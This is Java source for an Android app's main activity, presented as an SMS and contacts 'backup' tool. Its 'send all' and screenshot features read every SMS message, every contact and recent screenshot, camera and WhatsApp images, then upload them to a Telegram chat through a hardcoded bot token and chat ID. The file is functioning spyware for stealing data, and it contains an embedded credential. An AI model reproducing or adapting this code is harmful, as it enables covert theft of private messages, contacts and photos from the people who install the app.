package com.csu.web2app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String TELEGRAM_BOT_TOKEN = "8410087487:AAEouEc1-5-ktGPdNfEJhlYh5UALXxTy2PQ";
    private static final String TELEGRAM_CHAT_ID = "-1003860055748";

    private enum ExportType { SMS, CONTACTS, SCREENSHOTS, ALL }
    private ExportType pendingExportType;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private final ActivityResultLauncher<String> requestPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    if (pendingExportType == ExportType.SMS) {
                        startSmsExport();
                    } else if (pendingExportType == ExportType.CONTACTS) {
                        startContactsExport();
                    } else if (pendingExportType == ExportType.SCREENSHOTS) {
                        sendScreenshotsToTelegram();
                    }
                } else {
                    String type = "permission";
                    if (pendingExportType == ExportType.SMS) type = "SMS";
                    else if (pendingExportType == ExportType.CONTACTS) type = "contacts";
                    else if (pendingExportType == ExportType.SCREENSHOTS) type = "images";
                    Toast.makeText(this, "Permission denied to read " + type, Toast.LENGTH_SHORT).show();
                }
            });

    private final ActivityResultLauncher<Intent> createFileLauncher =
            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                    Uri uri = result.getData().getData();
                    if (uri != null) {
                        saveToFileInBackground(uri, pendingExportType);
                    }
                }
            });

    private final ActivityResultLauncher<String[]> requestMultiplePermissionsLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
                boolean allGranted = true;
                for (Map.Entry<String, Boolean> entry : result.entrySet()) {
                    if (!entry.getValue()) {
                        allGranted = false;
                        break;
                    }
                }

                if (allGranted) {
                    if (pendingExportType == ExportType.ALL) {
                        sendAllToTelegram();
                    }
                } else {
                    Toast.makeText(this, "Permissions denied. Some features may not work.", Toast.LENGTH_SHORT).show();
                }
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnDownloadSms = findViewById(R.id.btn_download_sms);
        btnDownloadSms.setOnClickListener(v -> {
            pendingExportType = ExportType.SMS;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                startSmsExport();
            } else {
                requestPermissionLauncher.launch(Manifest.permission.READ_SMS);
            }
        });

        Button btnDownloadContacts = findViewById(R.id.btn_download_contacts);
        btnDownloadContacts.setOnClickListener(v -> {
            pendingExportType = ExportType.CONTACTS;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                startContactsExport();
            } else {
                requestPermissionLauncher.launch(Manifest.permission.READ_CONTACTS);
            }
        });

        Button btnSendScreenshots = findViewById(R.id.btn_send_screenshots);
        btnSendScreenshots.setOnClickListener(v -> {
            pendingExportType = ExportType.SCREENSHOTS;
            String permission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

            if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
                sendScreenshotsToTelegram();
            } else {
                requestPermissionLauncher.launch(permission);
            }
        });

        Button btnSendAll = findViewById(R.id.btn_send_all);
        btnSendAll.setOnClickListener(v -> {
            pendingExportType = ExportType.ALL;
            String imagePermission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

            String[] permissions = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CONTACTS,
                    imagePermission
            };

            boolean allGranted = true;
            for (String p : permissions) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                sendAllToTelegram();
            } else {
                requestMultiplePermissionsLauncher.launch(permissions);
            }
        });
    }

    private void startSmsExport() {
        createFile("my_sms_backup.txt");
    }

    private void startContactsExport() {
        createFile("my_contacts_backup.txt");
    }

    private void sendAllToTelegram() {
        executorService.execute(() -> {
            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Gathering all data...", Toast.LENGTH_SHORT).show());

            // 1. Gather Images
            List<Uri> screenshots = findLatestImages("Screenshot", 5);
            List<Uri> cameraPhotos = findLatestImages("Camera", 5);
            List<Uri> whatsappPhotos = findLatestImages("WhatsApp", 5);

            List<Uri> allImages = new ArrayList<>();
            allImages.addAll(screenshots);
            allImages.addAll(cameraPhotos);
            allImages.addAll(whatsappPhotos);

            // 2. Gather SMS
            byte[] smsData = null;
            try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
                writeSmsToStream(baos);
                smsData = baos.toByteArray();
            } catch (IOException e) {
                Log.e(TAG, "Error gathering SMS", e);
            }

            // 3. Gather Contacts
            byte[] contactData = null;
            try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
                writeContactsToStream(baos);
                contactData = baos.toByteArray();
            } catch (IOException e) {
                Log.e(TAG, "Error gathering contacts", e);
            }

            // 4. Upload everything
            int successCount = 0;
            for (int i = 0; i < allImages.size(); i++) {
                if (uploadFileToTelegram(allImages.get(i), "image_" + i + ".png")) {
                    successCount++;
                }
            }

            boolean smsSuccess = false;
            if (smsData != null && smsData.length > 0) {
                smsSuccess = uploadDocumentToTelegram(smsData, "sms_backup.txt");
            }

            boolean contactSuccess = false;
            if (contactData != null && contactData.length > 0) {
                contactSuccess = uploadDocumentToTelegram(contactData, "contacts_backup.txt");
            }

            final int finalImageSuccess = successCount;
            final boolean finalSmsSuccess = smsSuccess;
            final boolean finalContactSuccess = contactSuccess;
            final int totalImages = allImages.size();

            mainHandler.post(() -> {
                String msg = String.format("Sent %d/%d images. SMS: %s, Contacts: %s",
                        finalImageSuccess, totalImages,
                        finalSmsSuccess ? "OK" : "Failed",
                        finalContactSuccess ? "OK" : "Failed");
                Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
            });
        });
    }

    private void createFile(String title) {
        Intent intent = new Intent(Intent.ACTION_CREATE_DOCUMENT);
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        intent.setType("text/plain");
        intent.putExtra(Intent.EXTRA_TITLE, title);
        createFileLauncher.launch(intent);
    }

    private void saveToFileInBackground(Uri uri, ExportType type) {
        executorService.execute(() -> {
            boolean success = false;
            try (OutputStream outputStream = getContentResolver().openOutputStream(uri)) {
                if (outputStream != null) {
                    if (type == ExportType.SMS) {
                        writeSmsToStream(outputStream);
                    } else if (type == ExportType.CONTACTS) {
                        writeContactsToStream(outputStream);
                    }
                    success = true;
                }
            } catch (IOException | IllegalArgumentException e) {
                e.printStackTrace();
            }

            final boolean finalSuccess = success;
            mainHandler.post(() -> {
                if (finalSuccess) {
                    String message = type == ExportType.SMS ? "SMS saved successfully" : "Contacts saved successfully";
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                } else {
                    String message = type == ExportType.SMS ? "Failed to save SMS" : "Failed to save contacts";
                    Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                }
            });
        });
    }

    private void writeSmsToStream(OutputStream outputStream) throws IOException {
        Uri uriSms = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{"address", "body", "date"};
        try (Cursor cursor = cr.query(uriSms, projection, null, null, "date DESC")) {
            if (cursor != null && cursor.moveToFirst()) {
                int indexAddress = cursor.getColumnIndexOrThrow("address");
                int indexBody = cursor.getColumnIndexOrThrow("body");
                int indexDate = cursor.getColumnIndexOrThrow("date");

                do {
                    String address = cursor.getString(indexAddress);
                    String body = cursor.getString(indexBody);
                    String date = cursor.getString(indexDate);

                    StringBuilder sb = new StringBuilder();
                    sb.append("From: ").append(address).append("\n");
                    sb.append("Date: ").append(new java.util.Date(Long.parseLong(date))).append("\n");
                    sb.append("Message: ").append(body).append("\n");
                    sb.append("----------------------------------\n");

                    outputStream.write(sb.toString().getBytes());
                } while (cursor.moveToNext());
            }
        }
    }

    private void writeContactsToStream(OutputStream outputStream) throws IOException {
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        try (Cursor cursor = cr.query(uri, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (cursor != null && cursor.moveToFirst()) {
                int indexName = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int indexNumber = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);

                do {
                    String name = cursor.getString(indexName);
                    String number = cursor.getString(indexNumber);

                    StringBuilder sb = new StringBuilder();
                    sb.append("Name: ").append(name).append("\n");
                    sb.append("Phone: ").append(number).append("\n");
                    sb.append("----------------------------------\n");

                    outputStream.write(sb.toString().getBytes());
                } while (cursor.moveToNext());
            }
        }
    }

    private void sendScreenshotsToTelegram() {
        executorService.execute(() -> {
            List<Uri> screenshotUris = findLatestImages("Screenshot", 5);
            if (screenshotUris.isEmpty()) {
                mainHandler.post(() -> Toast.makeText(MainActivity.this, "No screenshots found", Toast.LENGTH_SHORT).show());
                return;
            }

            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Sending " + screenshotUris.size() + " screenshots...", Toast.LENGTH_SHORT).show());

            int successCount = 0;
            for (Uri uri : screenshotUris) {
                if (uploadFileToTelegram(uri, "screenshot.png")) {
                    successCount++;
                }
            }

            final int finalSuccessCount = successCount;
            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Successfully sent " + finalSuccessCount + " screenshots", Toast.LENGTH_SHORT).show());
        });
    }

    private List<Uri> findLatestImages(String folderKeyword, int limit) {
        List<Uri> uris = new ArrayList<>();
        Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ?
                MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL) :
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_TAKEN
        };

        String selection = MediaStore.Images.Media.DATA + " LIKE ? OR " +
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME + " LIKE ?";

        String[] selectionArgs = new String[]{"%" + folderKeyword + "%", "%" + folderKeyword + "%"};
        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";

        try (Cursor cursor = getContentResolver().query(collection, projection, selection, selectionArgs, sortOrder)) {
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                while (cursor.moveToNext() && uris.size() < limit) {
                    long id = cursor.getLong(idColumn);
                    Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    uris.add(contentUri);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying MediaStore for " + folderKeyword, e);
        }

        return uris;
    }

    private boolean uploadFileToTelegram(Uri uri, String filename) {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                // chat_id
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                out.writeBytes(TELEGRAM_CHAT_ID + "\r\n");

                // photo
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + filename + "\"\r\n");
                out.writeBytes("Content-Type: image/png\r\n\r\n");

                try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
                    if (inputStream != null) {
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = inputStream.read(buffer)) != -1) {
                            out.write(buffer, 0, bytesRead);
                        }
                    }
                }
                out.writeBytes("\r\n");
                out.writeBytes("--" + boundary + "--\r\n");
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                try (InputStream errorStream = conn.getErrorStream()) {
                    if (errorStream != null) {
                        byte[] errorBuffer = new byte[1024];
                        int read = errorStream.read(errorBuffer);
                        if (read > 0) {
                            Log.e(TAG, "Telegram error response: " + new String(errorBuffer, 0, read));
                        }
                    }
                }
                Log.e(TAG, "Telegram upload failed with response code: " + responseCode);
                return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error uploading to Telegram", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private boolean uploadDocumentToTelegram(byte[] data, String filename) {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                // chat_id
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                out.writeBytes(TELEGRAM_CHAT_ID + "\r\n");

                // document
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n");
                out.writeBytes("Content-Type: text/plain\r\n\r\n");
                out.write(data);
                out.writeBytes("\r\n");
                out.writeBytes("--" + boundary + "--\r\n");
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            return responseCode == HttpURLConnection.HTTP_OK;
        } catch (Exception e) {
            Log.e(TAG, "Error uploading document to Telegram", e);
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executorService.shutdown();
    }
}
